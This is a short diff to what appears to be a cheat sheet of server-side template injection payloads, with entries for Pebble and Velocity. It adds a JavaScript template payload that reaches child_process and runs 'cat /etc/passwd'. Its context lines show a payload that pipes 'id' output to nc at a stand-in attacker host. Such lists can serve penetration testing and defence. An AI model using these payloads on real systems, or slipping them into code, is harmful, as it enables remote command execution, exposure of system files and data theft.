@@ -291,6 +291,10 @@ New version of Pebble :
 = x.exec('id | nc attacker.net 80')
 ```
 
+```javascript
+#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+```
+
 ## Velocity
 
 ```python
